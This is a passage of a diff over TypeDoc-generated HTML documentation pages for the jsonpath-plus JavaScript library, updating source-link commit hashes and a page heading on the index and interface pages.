\"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\".\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><h2>jsonpath-plus</h2></div><div class=\"tsd-panel tsd-typography\"><p><a href=\"https://www.npmjs.com/package/jsonpath-plus\" target=\"_blank\" class=\"external\"><img src=\"https://img.shields.io/npm/v/jsonpath-plus.svg\" alt=\"npm\"></a></p>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"assets/style.css\"/><link rel=\"stylesheet\" href=\"assets/highlight.css\"/><script defer src=\"assets/main.js\"></script><script async src=\"assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\".\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><h1>jsonpath-plus</h1></div><div class=\"tsd-panel tsd-typography\"><p><a href=\"https://www.npmjs.com/package/jsonpath-plus\" target=\"_blank\" class=\"external\"><img src=\"https://img.shields.io/npm/v/jsonpath-plus.svg\" alt=\"npm\"></a></p>\n <p><a href=\"badges/tests-badge.svg\"><img src=\"https://raw.githubusercontent.com/s3u/JSONPath/master/badges/tests-badge.svg?sanitize=true\" alt=\"testing badge\"></a>\n <a href=\"badges/coverage-badge.svg\"><img src=\"https://raw.githubusercontent.com/s3u/JSONPath/master/badges/coverage-badge.svg?sanitize=true\" alt=\"coverage badge\"></a></p>\n <p><a href=\"https://snyk.io/test/github/s3u/JSONPath\" target=\"_blank\" class=\"external\"><img src=\"https://snyk.io/test/github/s3u/JSONPath/badge.svg\" alt=\"Known Vulnerabilities\"></a></p>\n```\n\nFilename: docs/ts/interfaces/JSONPathCallable.html:\n```\n@@ -1 +1 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathCallable | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathCallable.html\">JSONPathCallable</a></li></ul><h1>Interface JSONPathCallable</h1></div><section class=\"tsd-panel\"><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPathCallable\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath<wbr/>Callable</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable.T\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a><a href=\"#JSONPathCallable\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPathCallable.T\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <a href=\"JSONPathOptionsAutoStart.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptionsAutoStart</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L163\">jsonpath.d.ts:163</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPathCallable-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath<wbr/>Callable</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a><a href=\"#JSONPathCallable-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPathCallable-1.T-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <a href=\"JSONPathOptions.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptions</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L164\">jsonpath.d.ts:164</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPathCallable-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath<wbr/>Callable</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span>, <span class=\"tsd-kind-parameter\">json</span>, <span class=\"tsd-kind-parameter\">callback</span>, <span class=\"tsd-kind-parameter\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a><a href=\"#JSONPathCallable-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPathCallable-2.T-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">json</span>: <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">callback</span>: <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></span></li><li><span><span class=\"tsd-kind-parameter\">otherTypeCallback</span>: <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L166\">jsonpath.d.ts:166</a></li></ul></aside></li></ul></section></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathCallable | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathCallable.html\">JSONPathCallable</a></li></ul><h1>Interface JSONPathCallable</h1></div><section class=\"tsd-panel\"><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPathCallable\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath<wbr/>Callable</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable.T\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a><a href=\"#JSONPathCallable\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPathCallable.T\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <a href=\"JSONPathOptionsAutoStart.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptionsAutoStart</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L163\">jsonpath.d.ts:163</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPathCallable-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath<wbr/>Callable</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a><a href=\"#JSONPathCallable-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPathCallable-1.T-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <a href=\"JSONPathOptions.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptions</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L164\">jsonpath.d.ts:164</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPathCallable-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath<wbr/>Callable</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span>, <span class=\"tsd-kind-parameter\">json</span>, <span class=\"tsd-kind-parameter\">callback</span>, <span class=\"tsd-kind-parameter\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a><a href=\"#JSONPathCallable-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPathCallable-2.T-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">json</span>: <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">callback</span>: <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></span></li><li><span><span class=\"tsd-kind-parameter\">otherTypeCallback</span>: <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L166\">jsonpath.d.ts:166</a></li></ul></aside></li></ul></section></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: docs/ts/interfaces/JSONPathOptions.html:\n```\n@@ -1,4 +1,4 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathOptions | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathOptions.html\">JSONPathOptions</a></li></ul><h1>Interface 